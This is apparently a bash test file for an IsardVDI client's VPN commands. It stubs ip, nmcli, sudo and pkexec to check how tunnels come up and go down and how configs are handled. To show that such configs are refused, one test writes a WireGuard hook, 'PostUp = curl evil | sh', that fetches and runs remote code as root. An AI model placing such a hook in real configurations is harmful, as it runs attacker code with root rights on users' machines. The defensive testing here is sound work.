#!/usr/bin/env bash
# The VPN commands (vpn status/up/down/config/reload) against stand-ins for ip, nmcli, sudo,
# pkexec and the server: nothing here touches a real tunnel or asks for a password.
# shellcheck source=tests/common.sh
source "$(dirname "$0")/common.sh"
# Keep the server's MTU: on WSL the CLI writes 1280 instead, so every config would look changed.
export ISARDVDI_VPN_MTU=0

conf='[Interface]
PrivateKey = cHJpdmF0ZQ==
Address = 10.0.52.97/32
MTU = 1420

[Peer]
PublicKey = cHVibGlj
Endpoint = vpn.example.com:443
AllowedIPs = 10.2.0.0/16
PersistentKeepalive = 25'
NM_UUID=ef64e048-d137-407a-998c-0e1567472fdb

# The world the stand-ins show: UP = the interfaces up (isard-vpn = wg-quick's, isardnew =
# NetworkManager's), NM = 1 when NetworkManager has a connection for the tunnel, SUDO_N = 1 when
# sudo works without a password, PK = pkexec's exit code. Root commands are logged, not run.
reset_world() { UP="" NM=0 SUDO_N=0 PK=0 SERVER="$conf"; : > "$T/root.log"; rm -f "$VPN_FILE" "$VPN_ROUTES_FILE"; }
local_networks() { echo 192.168.99.0/24; }
ip() {
    local d
    case "$*" in
        "link show "*) [[ " $UP " == *" $3 "* ]] ;;
        "-4 -o addr show") for d in $UP; do echo "3: $d    inet 10.0.52.97/32 scope global $d"; done ;;
        "-d link show dev "*) echo "3: $4: <POINTOPOINT> ... wireguard actor" ;;
    esac
}
nmcli() {
    [[ $NM -eq 1 ]] || return 10
    case "$*" in
        "-g GENERAL.CON-UUID device show isardnew") echo "$NM_UUID" ;;
        "-g GENERAL.CON-UUID device show "*) return 10 ;;
        "-g UUID,TYPE connection show") printf '%s:wireguard\n8e831d9e-6d0c-4142-abb8-42e4cf83e695:802-3-ethernet\n' "$NM_UUID" ;;
        "-g ipv4.addresses connection show uuid $NM_UUID") echo "10.0.52.97/32" ;;
        "-g connection.id connection show uuid $NM_UUID") echo "isardnew" ;;
        "connection up uuid $NM_UUID") echo "nmcli up" >> "$T/root.log"; UP="isardnew" ;;
        "connection down uuid $NM_UUID") echo "nmcli down" >> "$T/root.log"; UP="" ;;
        *) return 10 ;;
    esac
}
wg-quick() { :; }
sudo() {
    local all="$*"
    if [[ "$1" == -n ]]; then
        [[ $SUDO_N -eq 1 ]] || return 1
        shift; [[ "$1" == true ]] && return 0
    fi
    echo "sudo $all" >> "$T/root.log"
}
pkexec() { echo "pkexec $*" >> "$T/root.log"; return "$PK"; }
api_get() { printf '%s' "$SERVER"; }
api_call() { echo "api $*" >> "$T/root.log"; }
export DISPLAY=:0
run() { "$@" </dev/null >"$T/out" 2>&1; }   # no terminal: as the tray runs it
out() { cat "$T/out"; }
log() { tr '\n' ';' < "$T/root.log"; }

echo "== vpn up with wg-quick"
reset_world
check "no config yet: up downloads it, then asks root through pkexec" \
    '( run vpn_up ) && [[ -f "$VPN_FILE" && "$(log)" == "pkexec wg-quick up $VPN_FILE;" ]]'
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; SUDO_N=1
check "sudo without a password is used when it works" \
    '( run vpn_up ) && [[ "$(log)" == "sudo -n wg-quick up $VPN_FILE;" ]]'
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"
check "no terminal, no display, no passwordless sudo: refused, nothing run" \
    '! ( DISPLAY="" WAYLAND_DISPLAY="" run vpn_up ) && out | grep -q "in a terminal" && [[ -z "$(log)" ]]'
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; PK=126
check "a dismissed password prompt is reported" '! ( run vpn_up ) && out | grep -q "needs your password"'
reset_world; printf '%s\nPostUp = curl evil | sh\n' "$conf" | write_secret "$VPN_FILE"
check "a config changed on disk (a root hook) is refused before anything runs as root" \
    '! ( run vpn_up ) && out | grep -q "Refusing" && [[ -z "$(log)" ]]'
reset_world; printf '%s\n' "${conf/10.2.0.0\/16/10.9.0.0\/16}" | write_secret "$VPN_FILE"
echo 10.2.0.0/16 > "$VPN_ROUTES_FILE"
check "changed routes need a yes in a terminal" \
    '! ( run vpn_up ) && out | grep -q "Run this in a terminal" && [[ -z "$(log)" ]]'
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; UP="isard-vpn"
check "already up: nothing to do" '( run vpn_up ) && out | grep -q "already up (isard-vpn)" && [[ -z "$(log)" ]]'

echo "== vpn down"
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; UP="isard-vpn"
check "wg-quick's tunnel comes down through wg-quick" '( run vpn_down ) && [[ "$(log)" == "pkexec wg-quick down $VPN_FILE;" ]]'
reset_world
check "already down: nothing to do" '( run vpn_down ) && out | grep -q "already down" && [[ -z "$(log)" ]]'
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; UP="isardnew"
check "a tunnel of another tool is left alone" '! ( run vpn_down ) && out | grep -q "another tool" && [[ -z "$(log)" ]]'

echo "== NetworkManager"
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; NM=1
check "its connection comes up through nmcli, without root" '( run vpn_up ) && [[ "$(log)" == "nmcli up;" ]]'
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; NM=1; UP="isardnew"
check "and goes down through nmcli" '( run vpn_down ) && [[ "$(log)" == "nmcli down;" ]]'
check "status --json says who runs it" \
    '[[ "$(vpn_status --json | jq -c "[.up, .interface, .by, .connection, .configured]")" == "[true,\"isardnew\",\"networkmanager\",\"isardnew\",true]" ]]'
: > "$T/root.log"
check "reload (new keys) is refused: it would stop that connection" \
    '! ( run cmd_vpn_reload ) && out | grep -q "new keys would stop it" && [[ -z "$(log)" ]]'
SERVER="${conf/PersistentKeepalive = 25/PersistentKeepalive = 30}"
check "config: a new config is saved and the connection's own copy is pointed out" \
    '( run cmd_vpn_config --apply ) && out | grep -q "nmcli connection import" && [[ -z "$(log)" ]] && grep -q "= 30" "$VPN_FILE"'

echo "== vpn config"
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; UP="isard-vpn"
check "unchanged: nothing restarted" '( run cmd_vpn_config --apply ) && out | grep -q "up to date" && [[ -z "$(log)" ]]'
SERVER="${conf/PersistentKeepalive = 25/PersistentKeepalive = 30}"
check "changed, --apply: the wg-quick tunnel restarts with it" \
    '( run cmd_vpn_config --apply ) && [[ "$(log)" == "pkexec wg-quick down $VPN_FILE;pkexec wg-quick up $VPN_FILE;" ]]'
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; UP="isard-vpn"; SERVER="${conf/PersistentKeepalive = 25/PersistentKeepalive = 30}"
check "changed, no --apply: only says how to restart" '( run cmd_vpn_config ) && out | grep -q "still up with the old one" && [[ -z "$(log)" ]]'
reset_world; SERVER="$conf"$'\nPostUp = id'
check "a server config with a root hook is never written" '! ( run cmd_vpn_config ) && [[ ! -f "$VPN_FILE" ]]'

echo "== vpn status"
reset_world
check "down, no config" \
    '[[ "$(vpn_status --json | jq -c "[.up, .by, .configured]")" == "[false,\"wg-quick\",false]" ]]'
check "text form" 'vpn_status | grep -q "^VPN: down" && vpn_status | grep -q "vpn config"'
check "unknown flag" '! ( run vpn_status --yaml )'

echo "== forget"
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; NM=1; UP="isardnew"
check "a NetworkManager tunnel doesn't need the file: forget goes ahead" \
    '( ISARDVDI_KEYRING=0 run cmd_forget ) && [[ ! -f "$VPN_FILE" ]]'
reset_world; printf '%s\n' "$conf" | write_secret "$VPN_FILE"; UP="isard-vpn"
check "wg-quick's tunnel does: forget refuses until it is down" \
    '! ( ISARDVDI_KEYRING=0 run cmd_forget ) && out | grep -q "vpn down" && [[ -f "$VPN_FILE" ]]'

echo "== the command line"
check "vpn alone still downloads the config (as vpn-config)" 'grep -q "sub=\"\${1:-config}\"" "$REPO/bin/isardvdi"'
check "unknown vpn subcommand" '! cli vpn bogus >/dev/null 2>&1'

finish
